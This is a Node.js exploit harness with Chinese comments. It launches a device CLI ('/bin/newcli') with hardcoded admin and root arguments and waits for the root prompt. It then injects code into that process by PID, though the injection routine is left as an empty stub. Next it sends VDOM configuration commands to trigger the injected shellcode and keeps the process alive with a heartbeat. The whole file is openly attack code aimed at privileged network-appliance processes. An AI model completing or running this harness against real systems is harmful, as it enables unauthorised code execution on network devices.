const { spawn, execFile } = require("child_process");
const { promisify } = require("util");
const execFileAsync = promisify(execFile);

const args = process.argv.slice(2);
const CONFIG = {
  VDOM_TARGET: args[0],
};

// ---------- 1. 启动 newcli ----------
const child = spawn(
  "/bin/newcli",
  ["admin", "admin", "root", "super_admin", "root"],
  {
    stdio: ["pipe", "pipe", "pipe"],
  },
);

child.on("error", (err) => {
  console.error("spawn failed:", err);
  process.exit(1);
});

// newcli 崩溃后写 stdin 会触发 EPIPE
child.stdin.on("error", (err) => {
  if (err.code !== "EPIPE") console.error("stdin error:", err);
});

// ---------- 2. 状态机 ----------
const S = { WAIT_PROMPT: 0, INJECTING: 1, RUNNING: 2 };
let state = S.WAIT_PROMPT;
let buf = "";

child.stdout.on("data", (data) => {
  const text = data.toString();
  process.stdout.write(text);
  buf += text;
  if (buf.length > 4096) buf = buf.slice(-4096); // 防止缓冲膨胀

  // 提示符以 "# " 结尾且后面无换行
  if (state === S.WAIT_PROMPT && /#\s$/.test(buf)) {
    state = S.INJECTING;
    onReady().catch((e) => {
      console.error("inject/trigger failed:", e);
      shutdown(1);
    });
  }
});

child.stderr.on("data", (data) => {
  console.error("STDERR:", data.toString());
});

async function onReady() {
  // ---------- 3. 进程注入：等它彻底完成 ----------
  await performInjection(child.pid);

  // ---------- 4. 注入完成后再发触发命令 ----------
  child.stdin.write("config vdom\n");
  child.stdin.write(`edit ${CONFIG.VDOM_TARGET}\n`);
  child.stdin.write("end\n");
  // 注意：不能有 "exit\n" 和 stdin.end()

  state = S.RUNNING;
  startHeartbeat();
  console.log("\n[*] triggered, newcli kept alive, shellcode running");
}

// 注入程序
async function performInjection(pid) {
  console.log("\n[*] hooking into newcli pid", pid, "...");
  // 注入代码
  console.log("\n[*] injection done");
}

// ---------- 5. 保活 ----------
let heartbeat = null;
function startHeartbeat() {
  heartbeat = setInterval(() => {
    if (state === S.RUNNING) child.stdin.write("\n"); // 空行只刷新提示符
  }, 60_000);
}

// ---------- 6. 退出控制（之后接到指令/信号时调 shutdown） ----------
function shutdown(code = 0) {
  if (heartbeat) clearInterval(heartbeat);
  try {
    child.stdin.write("exit\n");
  } catch {}
  // 给正常退出 2 秒，超时强杀
  setTimeout(() => {
    try {
      child.kill("SIGKILL");
    } catch {}
    process.exit(code);
  }, 2000).unref();
}

process.on("SIGINT", () => shutdown(0));
process.on("SIGTERM", () => shutdown(0));

child.on("close", (code, signal) => {
  // RUNNING 状态下 close = shellcode 把进程搞崩了或被杀，要报出
  console.log(
    `\nnewcli exited (code=${code}, signal=${signal}), state=${state}`,
  );
  if (heartbeat) clearInterval(heartbeat);
  process.exit(code ?? 1);
});
